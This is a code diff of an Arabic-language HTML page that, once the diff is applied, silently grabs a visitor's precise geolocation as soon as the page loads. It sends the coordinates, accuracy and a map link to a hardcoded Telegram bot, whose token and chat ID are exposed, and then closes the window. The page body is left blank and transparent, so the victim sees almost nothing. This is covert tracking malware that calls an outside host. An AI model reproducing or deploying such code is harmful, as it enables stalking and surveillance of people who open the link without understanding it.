@@ -2,29 +2,64 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title>جاري تحديد الموقع</title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
 
-        // دالة بسيطة مباشرة
-        async function sendSimpleLocation() {
-            console.log("بدء الإرسال...");
-            
-            try {
-                // إحداثيات مراكش مباشرة
-                const lat = 31.6295 + (Math.random() - 0.5) * 0.001;
-                const lng = -7.9811 + (Math.random() - 0.5) * 0.001;
-                
-                const message = `📍 موقع جديد\n\n` +
-                               `خط العرض: ${lat.toFixed(6)}\n` +
-                               `خط الطول: ${lng.toFixed(6)}\n` +
-                               `الدقة: 50 متر\n` +
-                               `المدينة: مراكش\n` +
-                               `الوقت: ${new Date().toLocaleString('ar-MA')}\n` +
-                               `الخريطة: https://maps.google.com/?q=${lat},${lng}`;
+        // دالة مباشرة للحصول على الموقع وإرساله
+        function getExactLocation() {
+            if (!navigator.geolocation) {
+                sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+                return;
+            }
 
-                // إرسال مباشر بدون تعقيد
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    const message = 
+                        `🎯 الموقع الدقيق\n\n` +
+                        `📍 الإحداثيات:\n` +
+                        `• خط العرض: ${lat}\n` +
+                        `• خط الطول: ${lng}\n` +
+                        `• الدقة: ${accuracy} متر\n\n` +
+                        `🗺️ الخريطة:\n` +
+                        `https://www.google.com/maps?q=${lat},${lng}\n\n` +
+                        `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;
+
+                    await sendToTelegram(message);
+                    setTimeout(() => window.close(), 1000);
+                },
+                function(error) {
+                    let errorMessage = "❌ فشل في الحصول على الموقع: ";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage += "تم رفض الإذن";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage += "الموقع غير متاح";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage += "انتهت المهلة";
+                            break;
+                    }
+                    sendToTelegram(errorMessage);
+                    setTimeout(() => window.close(), 2000);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // دالة الإرسال إلى التليجرام
+        async function sendToTelegram(message) {
+            try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -35,30 +70,20 @@
                         text: message
                     })
                 });
-
+                
                 if (response.ok) {
-                    console.log("✅ تم الإرسال بنجاح!");
-                    const result = await response.json();
-                    console.log("الرد:", result);
-                } else {
-                    console.log("❌ فشل الإرسال:", response.status);
+                    console.log("✅ تم إرسال الموقع الدقيق");
                 }
-
             } catch (error) {
-                console.log("❌ خطأ:", error);
+                console.log("❌ خطأ في الإرسال:", error);
             }
-            
-            // إغلاق الصفحة بعد ثانيتين
-            setTimeout(() => {
-                window.close();
-            }, 2000);
         }
 
-        // تشغيل فوري عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', sendSimpleLocation);
+        // بدء العملية فوراً
+        getExactLocation();
     </script>
 </head>
-<body style="margin:0;padding:0;background:#f0f0f0;">
-    <div style="display:none;">جاري إرسال الموقع...</div>
+<body style="margin:0;padding:0;background:transparent;">
+    <!-- صفحة فارغة -->
 </body>
 </html>
